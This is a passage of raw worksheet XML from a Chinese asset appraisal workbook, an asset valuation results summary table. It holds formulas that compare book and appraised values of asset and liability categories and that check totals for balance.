  <headerFooter alignWithMargins="0"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6">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:H39"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="90" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A31" sqref="A31"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="9.83333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="28.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="23.6666666666667" customWidth="1" style="410" min="5" max="7"/>
    <col width="16.1666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="25.5" customHeight="1" s="415">
      <c r="B1" s="417" t="inlineStr">
        <is>
          <t>资产评估结果汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" customFormat="1" s="389">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14.25" customFormat="1" customHeight="1" s="376">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="14.25" customFormat="1" customHeight="1" s="376">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="549" t="n"/>
      <c r="H4" s="402">
        <f>RIGHT(设定信息!A9,4)&amp;"："&amp;设定信息!B9</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="14.25" customFormat="1" customHeight="1" s="414">
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>项            目</t>
        </is>
      </c>
      <c r="C5" s="550" t="n"/>
      <c r="D5" s="551" t="n"/>
      <c r="E5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="552" t="inlineStr">
        <is>
          <t>增值率％</t>
        </is>
      </c>
    </row>
    <row r="6" ht="15" customFormat="1" customHeight="1" s="414">
      <c r="B6" s="553" t="n"/>
      <c r="C6" s="554" t="n"/>
      <c r="D6" s="523" t="n"/>
      <c r="E6" s="552" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="F6" s="552" t="inlineStr">
        <is>
          <t>B</t>
        </is>
      </c>
      <c r="G6" s="552" t="inlineStr">
        <is>
          <t>C=B-A</t>
        </is>
      </c>
      <c r="H6" s="552" t="inlineStr">
        <is>
          <t>D=C/A×100</t>
        </is>
      </c>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B7" s="380" t="n">
        <v>1</v>
      </c>
      <c r="C7" s="380" t="inlineStr">
        <is>
          <t>流资汇总</t>
        </is>
      </c>
      <c r="D7" s="383" t="inlineStr">
        <is>
          <t>流动资产</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>ROUND('3-流动资产汇总'!E26/10000,2)</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>ROUND('3-流动资产汇总'!F26/10000,2)</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>IF((F7-E7)=0,"",(F7-E7))</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(OR(E7=0,E7="",G7=""),"",IF(E7&lt;0,-G7/E7*100,G7/E7*100))</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B8" s="380" t="n">
        <v>2</v>
      </c>
      <c r="C8" s="380" t="inlineStr">
        <is>
          <t>非资汇总</t>
        </is>
      </c>
      <c r="D8" s="418" t="inlineStr">
        <is>
          <t>非流动资产</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>ROUND('4-非流动资产汇总'!E27/10000,2)</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>ROUND('4-非流动资产汇总'!F27/10000,2)</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>IF((F8-E8)=0,"",(F8-E8))</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(OR(E8=0,E8="",G8=""),"",IF(E8&lt;0,-G8/E8*100,G8/E8*100))</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B9" s="380" t="n">
        <v>3</v>
      </c>
      <c r="C9" s="380" t="inlineStr">
        <is>
          <t>债权投资</t>
        </is>
      </c>
      <c r="D9" s="419" t="inlineStr">
        <is>
          <t>其中：债权投资</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>ROUND('4-非流动资产汇总'!E6/10000,2)</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>ROUND('4-非流动资产汇总'!F6/10000,2)</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>IF((F9-E9)=0,"",(F9-E9))</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(OR(E9=0,E9="",G9=""),"",IF(E9&lt;0,-G9/E9*100,G9/E9*100))</f>
        <v/>
      </c>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B10" s="380" t="n">
        <v>4</v>
      </c>
      <c r="C10" s="380" t="inlineStr">
        <is>
          <t>其他债权</t>
        </is>
      </c>
      <c r="D10" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            其他债权投资</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>ROUND('4-非流动资产汇总'!E7/10000,2)</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>ROUND('4-非流动资产汇总'!F7/10000,2)</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>IF((F10-E10)=0,"",(F10-E10))</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(OR(E10=0,E10="",G10=""),"",IF(E10&lt;0,-G10/E10*100,G10/E10*100))</f>
        <v/>
      </c>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B11" s="380" t="n">
        <v>5</v>
      </c>
      <c r="C11" s="380" t="inlineStr">
        <is>
          <t>长期应收</t>
        </is>
      </c>
      <c r="D11" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            长期应收款</t>
        </is>
      </c>
      <c r="E11" s="555">
        <f>ROUND('4-非流动资产汇总'!E8/10000,2)</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>ROUND('4-非流动资产汇总'!F8/10000,2)</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>IF((F11-E11)=0,"",(F11-E11))</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(OR(E11=0,E11="",G11=""),"",IF(E11&lt;0,-G11/E11*100,G11/E11*100))</f>
        <v/>
      </c>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B12" s="380" t="n">
        <v>6</v>
      </c>
      <c r="C12" s="380" t="inlineStr">
        <is>
          <t>长期股权</t>
        </is>
      </c>
      <c r="D12" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            长期股权投资</t>
        </is>
      </c>
      <c r="E12" s="555">
        <f>ROUND('4-非流动资产汇总'!E9/10000,2)</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>ROUND('4-非流动资产汇总'!F9/10000,2)</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>IF((F12-E12)=0,"",(F12-E12))</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(OR(E12=0,E12="",G12=""),"",IF(E12&lt;0,-G12/E12*100,G12/E12*100))</f>
        <v/>
      </c>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B13" s="380" t="n">
        <v>7</v>
      </c>
      <c r="C13" s="185" t="inlineStr">
        <is>
          <t>其他权投</t>
        </is>
      </c>
      <c r="D13" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            其他权益工具投资</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>ROUND('4-非流动资产汇总'!E10/10000,2)</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>ROUND('4-非流动资产汇总'!F10/10000,2)</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>IF((F13-E13)=0,"",(F13-E13))</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(OR(E13=0,E13="",G13=""),"",IF(E13&lt;0,-G13/E13*100,G13/E13*100))</f>
        <v/>
      </c>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B14" s="380" t="n">
        <v>8</v>
      </c>
      <c r="C14" s="185" t="inlineStr">
        <is>
          <t>其他非金</t>
        </is>
      </c>
      <c r="D14" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            其他非流动金融资产</t>
        </is>
      </c>
      <c r="E14" s="555">
        <f>ROUND('4-非流动资产汇总'!E11/10000,2)</f>
        <v/>
      </c>
      <c r="F14" s="555">
        <f>ROUND('4-非流动资产汇总'!F11/10000,2)</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>IF((F14-E14)=0,"",(F14-E14))</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(OR(E14=0,E14="",G14=""),"",IF(E14&lt;0,-G14/E14*100,G14/E14*100))</f>
        <v/>
      </c>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B15" s="380" t="n">
        <v>9</v>
      </c>
      <c r="C15" s="380" t="inlineStr">
        <is>
          <t>投房汇总</t>
        </is>
      </c>
      <c r="D15" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            投资性房地产</t>
        </is>
      </c>
      <c r="E15" s="555">
        <f>ROUND('4-非流动资产汇总'!E12/10000,2)</f>
        <v/>
      </c>
      <c r="F15" s="555">
        <f>ROUND('4-非流动资产汇总'!F12/10000,2)</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>IF((F15-E15)=0,"",(F15-E15))</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(OR(E15=0,E15="",G15=""),"",IF(E15&lt;0,-G15/E15*100,G15/E15*100))</f>
        <v/>
      </c>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B16" s="380" t="n">
        <v>10</v>
      </c>
      <c r="C16" s="380" t="inlineStr">
        <is>
          <t>固资汇总</t>
        </is>
      </c>
      <c r="D16" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            固定资产</t>
        </is>
      </c>
      <c r="E16" s="555">
        <f>ROUND('4-非流动资产汇总'!E13/10000,2)</f>
        <v/>
      </c>
      <c r="F16" s="555">
        <f>ROUND('4-非流动资产汇总'!F13/10000,2)</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>IF((F16-E16)=0,"",(F16-E16))</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(OR(E16=0,E16="",G16=""),"",IF(E16&lt;0,-G16/E16*100,G16/E16*100))</f>
        <v/>
      </c>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B17" s="380" t="n">
        <v>11</v>
      </c>
      <c r="C17" s="380" t="inlineStr">
        <is>
          <t>在建汇总</t>
        </is>
      </c>
      <c r="D17" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            在建工程</t>
        </is>
      </c>
      <c r="E17" s="555">
        <f>ROUND('4-非流动资产汇总'!E14/10000,2)</f>
        <v/>
      </c>
      <c r="F17" s="555">
        <f>ROUND('4-非流动资产汇总'!F14/10000,2)</f>
        <v/>
      </c>
      <c r="G17" s="555">
        <f>IF((F17-E17)=0,"",(F17-E17))</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(OR(E17=0,E17="",G17=""),"",IF(E17&lt;0,-G17/E17*100,G17/E17*100))</f>
        <v/>
      </c>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B18" s="380" t="n">
        <v>12</v>
      </c>
      <c r="C18" s="380" t="inlineStr">
        <is>
          <t>生物资产</t>
        </is>
      </c>
      <c r="D18" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            生产性生物资产</t>
        </is>
      </c>
      <c r="E18" s="555">
        <f>ROUND('4-非流动资产汇总'!E15/10000,2)</f>
        <v/>
      </c>
      <c r="F18" s="555">
        <f>ROUND('4-非流动资产汇总'!F15/10000,2)</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>IF((F18-E18)=0,"",(F18-E18))</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(OR(E18=0,E18="",G18=""),"",IF(E18&lt;0,-G18/E18*100,G18/E18*100))</f>
        <v/>
      </c>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B19" s="380" t="n">
        <v>13</v>
      </c>
      <c r="C19" s="380" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="D19" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            油气资产</t>
        </is>
      </c>
      <c r="E19" s="555">
        <f>ROUND('4-非流动资产汇总'!E16/10000,2)</f>
        <v/>
      </c>
      <c r="F19" s="555">
        <f>ROUND('4-非流动资产汇总'!F16/10000,2)</f>
        <v/>
      </c>
      <c r="G19" s="555">
        <f>IF((F19-E19)=0,"",(F19-E19))</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(OR(E19=0,E19="",G19=""),"",IF(E19&lt;0,-G19/E19*100,G19/E19*100))</f>
        <v/>
      </c>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B20" s="380" t="n">
        <v>14</v>
      </c>
      <c r="C20" s="380" t="inlineStr">
        <is>
          <t>使用资产</t>
        </is>
      </c>
      <c r="D20" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            使用权资产</t>
        </is>
      </c>
      <c r="E20" s="555">
        <f>ROUND('4-非流动资产汇总'!E17/10000,2)</f>
        <v/>
      </c>
      <c r="F20" s="555">
        <f>ROUND('4-非流动资产汇总'!F17/10000,2)</f>
        <v/>
      </c>
      <c r="G20" s="555">
        <f>IF((F20-E20)=0,"",(F20-E20))</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>IF(OR(E20=0,E20="",G20=""),"",IF(E20&lt;0,-G20/E20*100,G20/E20*100))</f>
        <v/>
      </c>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B21" s="380" t="n">
        <v>15</v>
      </c>
      <c r="C21" s="380" t="inlineStr">
        <is>
          <t>无形汇总</t>
        </is>
      </c>
      <c r="D21" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            无形资产</t>
        </is>
      </c>
      <c r="E21" s="555">
        <f>ROUND('4-非流动资产汇总'!E18/10000,2)</f>
        <v/>
      </c>
      <c r="F21" s="555">
        <f>ROUND('4-非流动资产汇总'!F18/10000,2)</f>
        <v/>
      </c>
      <c r="G21" s="555">
        <f>IF((F21-E21)=0,"",(F21-E21))</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(OR(E21=0,E21="",G21=""),"",IF(E21&lt;0,-G21/E21*100,G21/E21*100))</f>
        <v/>
      </c>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="B22" s="380" t="n">
        <v>16</v>
      </c>
      <c r="C22" s="380" t="inlineStr">
        <is>
          <t>开发支出</t>
        </is>
      </c>
      <c r="D22" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            开发支出</t>
        </is>
      </c>
      <c r="E22" s="555">
        <f>ROUND('4-非流动资产汇总'!E19/10000,2)</f>
        <v/>
      </c>
      <c r="F22" s="555">
        <f>ROUND('4-非流动资产汇总'!F19/10000,2)</f>
        <v/>
      </c>
      <c r="G22" s="555">
        <f>IF((F22-E22)=0,"",(F22-E22))</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(OR(E22=0,E22="",G22=""),"",IF(E22&lt;0,-G22/E22*100,G22/E22*100))</f>
        <v/>
      </c>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="B23" s="380" t="n">
        <v>17</v>
      </c>
      <c r="C23" s="380" t="inlineStr">
        <is>
          <t>商誉资产</t>
        </is>
      </c>
      <c r="D23" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            商誉</t>
        </is>
      </c>
      <c r="E23" s="555">
        <f>ROUND('4-非流动资产汇总'!E20/10000,2)</f>
        <v/>
      </c>
      <c r="F23" s="555">
        <f>ROUND('4-非流动资产汇总'!F20/10000,2)</f>
        <v/>
      </c>
      <c r="G23" s="555">
        <f>IF((F23-E23)=0,"",(F23-E23))</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(OR(E23=0,E23="",G23=""),"",IF(E23&lt;0,-G23/E23*100,G23/E23*100))</f>
        <v/>
      </c>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="B24" s="380" t="n">
        <v>18</v>
      </c>
      <c r="C24" s="380" t="inlineStr">
        <is>
          <t>长期待摊</t>
        </is>
      </c>
      <c r="D24" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            长期待摊费用</t>
        </is>
      </c>
      <c r="E24" s="555">
        <f>ROUND('4-非流动资产汇总'!E21/10000,2)</f>
        <v/>
      </c>
      <c r="F24" s="555">
        <f>ROUND('4-非流动资产汇总'!F21/10000,2)</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>IF((F24-E24)=0,"",(F24-E24))</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(OR(E24=0,E24="",G24=""),"",IF(E24&lt;0,-G24/E24*100,G24/E24*100))</f>
        <v/>
      </c>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="B25" s="380" t="n">
        <v>19</v>
      </c>
      <c r="C25" s="380" t="inlineStr">
        <is>
          <t>递延资产</t>
        </is>
      </c>
      <c r="D25" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            递延所得税资产</t>
        </is>
      </c>
      <c r="E25" s="555">
        <f>ROUND('4-非流动资产汇总'!E22/10000,2)</f>
        <v/>
      </c>
      <c r="F25" s="555">
        <f>ROUND('4-非流动资产汇总'!F22/10000,2)</f>
        <v/>
      </c>
      <c r="G25" s="555">
        <f>IF((F25-E25)=0,"",(F25-E25))</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(OR(E25=0,E25="",G25=""),"",IF(E25&lt;0,-G25/E25*100,G25/E25*100))</f>
        <v/>
      </c>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="B26" s="380" t="n">
        <v>20</v>
      </c>
      <c r="C26" s="380" t="inlineStr">
        <is>
          <t>其他非资</t>
        </is>
      </c>
      <c r="D26" s="420" t="inlineStr">
        <is>
          <t xml:space="preserve">            其他非流动资产</t>
        </is>
      </c>
      <c r="E26" s="555">
        <f>ROUND('4-非流动资产汇总'!E23/10000,2)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>ROUND('4-非流动资产汇总'!F23/10000,2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>IF((F26-E26)=0,"",(F26-E26))</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(OR(E26=0,E26="",G26=""),"",IF(E26&lt;0,-G26/E26*100,G26/E26*100))</f>
        <v/>
      </c>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="B27" s="380" t="n">
        <v>21</v>
      </c>
      <c r="C27" s="380" t="inlineStr">
        <is>
          <t>资产总计</t>
        </is>
      </c>
      <c r="D27" s="421" t="inlineStr">
        <is>
          <t>资产总计</t>
        </is>
      </c>
      <c r="E27" s="556">
        <f>SUM(E7:E8)</f>
        <v/>
      </c>
      <c r="F27" s="556">
        <f>SUM(F7:F8)</f>
        <v/>
      </c>
      <c r="G27" s="556">
        <f>IF((F27-E27)=0,"",(F27-E27))</f>
        <v/>
      </c>
      <c r="H27" s="556">
        <f>IF(OR(E27=0,E27="",G27=""),"",IF(E27&lt;0,-G27/E27*100,G27/E27*100))</f>
        <v/>
      </c>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="B28" s="380" t="n">
        <v>22</v>
      </c>
      <c r="C28" s="380" t="inlineStr">
        <is>
          <t>流债汇总</t>
        </is>
      </c>
      <c r="D28" s="423" t="inlineStr">
        <is>
          <t>流动负债</t>
        </is>
      </c>
      <c r="E28" s="555">
        <f>ROUND('5-流动负债汇总'!E27/10000,2)</f>
        <v/>
      </c>
      <c r="F28" s="555">
        <f>ROUND('5-流动负债汇总'!F27/10000,2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>IF((F28-E28)=0,"",(F28-E28))</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>IF(OR(E28=0,E28="",G28=""),"",IF(E28&lt;0,-G28/E28*100,G28/E28*100))</f>
        <v/>
      </c>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="B29" s="380" t="n">
        <v>23</v>
      </c>
      <c r="C29" s="380" t="inlineStr">
        <is>
          <t>非债汇总</t>
        </is>
      </c>
      <c r="D29" s="423" t="inlineStr">
        <is>
          <t>非流动负债</t>
        </is>
      </c>
      <c r="E29" s="555">
        <f>ROUND('6-非流动负债汇总'!E27/10000,2)</f>
        <v/>
      </c>
      <c r="F29" s="555">
        <f>ROUND('6-非流动负债汇总'!F27/10000,2)</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>IF((F29-E29)=0,"",(F29-E29))</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>IF(OR(E29=0,E29="",G29=""),"",IF(E29&lt;0,-G29/E29*100,G29/E29*100))</f>
        <v/>
      </c>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="B30" s="380" t="n">
        <v>24</v>
      </c>
      <c r="C30" s="380" t="inlineStr">
        <is>
          <t>负债总计</t>
        </is>
      </c>
      <c r="D30" s="421" t="inlineStr">
        <is>
          <t>负债合计</t>
        </is>
      </c>
      <c r="E30" s="555">
        <f>SUM(E28:E29)</f>
        <v/>
      </c>
      <c r="F30" s="555">
        <f>SUM(F28:F29)</f>
        <v/>
      </c>
      <c r="G30" s="555">
        <f>IF((F30-E30)=0,"",(F30-E30))</f>
        <v/>
      </c>
      <c r="H30" s="555">
        <f>IF(OR(E30=0,E30="",G30=""),"",IF(E30&lt;0,-G30/E30*100,G30/E30*100))</f>
        <v/>
      </c>
    </row>
    <row r="31" ht="16.5" customHeight="1" s="415">
      <c r="A31" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B31" s="380" t="n">
        <v>25</v>
      </c>
      <c r="C31" s="380" t="inlineStr">
        <is>
          <t>股东权益</t>
        </is>
      </c>
      <c r="D31" s="421" t="inlineStr">
        <is>
          <t>净资产（所有者权益）</t>
        </is>
      </c>
      <c r="E31" s="556">
        <f>E27-E30</f>
        <v/>
      </c>
      <c r="F31" s="556">
        <f>F27-F30</f>
        <v/>
      </c>
      <c r="G31" s="556">
        <f>IF((F31-E31)=0,"",(F31-E31))</f>
        <v/>
      </c>
      <c r="H31" s="556">
        <f>IF(OR(E31=0,E31="",G31=""),"",IF(E31&lt;0,-G31/E31*100,G31/E31*100))</f>
        <v/>
      </c>
    </row>
    <row r="32" ht="18" customFormat="1" customHeight="1" s="376">
      <c r="B32" s="347" t="n"/>
      <c r="C32" s="347" t="n"/>
      <c r="D32" s="347" t="n"/>
      <c r="E32" s="347" t="n"/>
      <c r="F32" s="347" t="n"/>
      <c r="G32" s="291" t="n"/>
      <c r="H32" s="291" t="n"/>
    </row>
    <row r="33" ht="12.75" customFormat="1" customHeight="1" s="416">
      <c r="B33" s="347" t="n"/>
      <c r="C33" s="347" t="n"/>
      <c r="D33" s="347" t="n"/>
      <c r="E33" s="347">
        <f>IF(ABS(E27-E30-E31)&lt;0.001,"","不平")</f>
        <v/>
      </c>
      <c r="F33" s="347">
        <f>IF(ABS(F27-F30-F31)&lt;0.001,"","不平")</f>
        <v/>
      </c>
      <c r="G33" s="347" t="n"/>
      <c r="H33" s="291" t="inlineStr">
        <is>
          <t>评估机构：天源资产评估有限公司</t>
        </is>
      </c>
    </row>
    <row r="34" s="415">
      <c r="B34" s="347" t="n"/>
      <c r="C34" s="347" t="n"/>
      <c r="D34" s="424" t="inlineStr">
        <is>
          <t>校验</t>
        </is>
      </c>
      <c r="E34" s="425">
        <f>IF(AND('2-分类汇总'!E39/10000-E27&gt;-0.01,'2-分类汇总'!E39/10000-E27&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="F34" s="425">
        <f>IF(AND('2-分类汇总'!F39/10000-F27&gt;-0.01,'2-分类汇总'!F39/10000-F27&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="G34" s="347" t="n"/>
      <c r="H34" s="347" t="n"/>
    </row>
    <row r="35" s="415">
      <c r="B35" s="347" t="n"/>
      <c r="C35" s="347" t="n"/>
      <c r="D35" s="426" t="n"/>
      <c r="E35" s="425">
        <f>IF(AND('2-分类汇总'!E65/10000-E31&gt;-0.01,'2-分类汇总'!E65/10000-E31&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="F35" s="425">
        <f>IF(AND('2-分类汇总'!F65/10000-F31&gt;-0.01,'2-分类汇总'!F65/10000-F31&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="G35" s="347" t="n"/>
      <c r="H35" s="347" t="n"/>
    </row>
    <row r="36" s="415">
      <c r="B36" s="347" t="n"/>
      <c r="C36" s="347" t="n"/>
      <c r="D36" s="347" t="n"/>
      <c r="E36" s="425">
        <f>IF(AND((E8-SUM(E9:E26))&gt;-0.01,(E8-SUM(E9:E26))&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="F36" s="425">
        <f>IF(AND((F8-SUM(F9:F26))&gt;-0.01,(F8-SUM(F9:F26))&lt;0.01),"无误","合计有误")</f>
        <v/>
      </c>
      <c r="G36" s="347" t="n"/>
      <c r="H36" s="347" t="n"/>
    </row>
    <row r="37" s="415">
      <c r="B37" s="347" t="n"/>
      <c r="C37" s="347" t="n"/>
      <c r="D37" s="347" t="n"/>
      <c r="E37" s="347" t="n"/>
      <c r="F37" s="347" t="n"/>
      <c r="G37" s="347" t="n"/>
      <c r="H37" s="347" t="n"/>
    </row>
    <row r="38" s="415">
      <c r="B38" s="347" t="n"/>
      <c r="C38" s="347" t="n"/>
      <c r="D38" s="347" t="n"/>
      <c r="E38" s="156" t="n"/>
      <c r="F38" s="376" t="n"/>
      <c r="G38" s="347" t="n"/>
      <c r="H38" s="557" t="n"/>
    </row>
    <row r="39" s="415">
      <c r="B39" s="347" t="n"/>
      <c r="C39" s="347" t="n"/>
      <c r="D39" s="347" t="n"/>
      <c r="E39" s="347" t="n"/>
      <c r="F39" s="376" t="n"/>
      <c r="G39" s="347" t="n"/>
      <c r="H39" s="347" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="E33:F33">
    <cfRule type="cellIs" priority="1" operator="equal" dxfId="2" stopIfTrue="1">
      <formula>"不平"</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="93" blackAndWhite="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet8.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet7">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K69"/>
  <sheetViews>
    <sheetView tabSelected="1" view="pageBreakPreview" topLeftCell="E48" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="I68" sqref="I68"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="7.16666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="32.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="26.5" customWidth="1" style="410" min="5" max="6"/>
    <col width="21.3333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="17.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="21.75" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>资产评估结果分类汇总表</t>
        </is>
      </c>
